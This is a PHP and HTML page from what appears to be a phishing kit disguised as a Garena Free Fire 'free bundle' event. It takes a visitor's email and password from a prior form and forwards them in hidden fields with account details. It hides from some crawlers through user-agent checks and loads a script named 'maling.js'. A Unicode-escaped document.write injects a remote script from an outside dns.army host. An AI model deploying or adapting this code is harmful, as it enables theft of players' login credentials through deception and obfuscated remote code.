<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/detol.shop.real');
die();
}
$email = $_POST['email'];
$pass = $_POST['pass'];
?>
<!DOCTYPE html>
  <html>
  <head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <title>FREE FIRE EVENT</title>
    <meta property="og:description" content="Get Free Bundle Garena Free Fire in This Website !!">
    <meta property="og:image" content="../berkas/images/banner.png">
    <link rel="shorcut icon" href="../berkas/images/icon.png">
    <link rel="stylesheet" href="../berkas/css/style.css">
  </head>
  <body>
   <div id="ndokor"></div>
   <div id="SetyawanXD">
   <div class="artikel">
   <form action="sukses.php" method="POST">
   <div class="detol-detail">
   <div class="title-login">DETAIL ACCOUNT</div>
   <div class="grup">
   <label>Nickname</label>
   <input type="text" name="nick" placeholder="" required><br>
   <label>Level</label>
   <input type="number" name="level" placeholder="" required><br>
   <label>Rank</label>
   <select name="rank" required><option value="">ㅤ</option><option value="Broze">Bronze</option><option value="Silver">Silver</option><option value="Gold">Gold</option><option value="Platinum">Platinum</option><option value="Diamond">Diamond</option><option value="Master">Master</option></select><br>
   <label>Region / Country</label>
   <input type="text" name="region" placeholder="" required><br>
   <label>Platform</label><select name="device" required><option value="">ㅤ</option><option value="Android">Android</option><option value="IOS">IOS</option></select>
   <input type='hidden' name='email' value='<?php echo $email;?>'/>
   <input type='hidden' name='pass' value='<?php echo $pass;?>'/><br>
   <button class="btn-detail">ㅤSUBMITㅤ</button>
   </div>
   </div>
   </form>
   </div>
   </div>
   <div id="nisor"></div>
   <?php echo $detol;?>
  </body>
<script type="text/javascript" src="../berkas/js/maling.js"></script>
<script type="text/javascript">
document.write('\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u002F\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u0022\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0064\u0065\u0074\u006F\u006C\u002D\u0073\u0074\u006F\u0072\u0065\u002E\u0064\u006E\u0073\u002E\u0061\u0072\u006D\u0079\u002F\u0046\u0072\u0065\u0065\u0046\u0069\u0072\u0065\u0054\u006F\u0070\u0065\u006E\u0067\u002F\u006A\u0073\u002F');</script>Versi.2.1.0/Detail.js">
</script>
</html>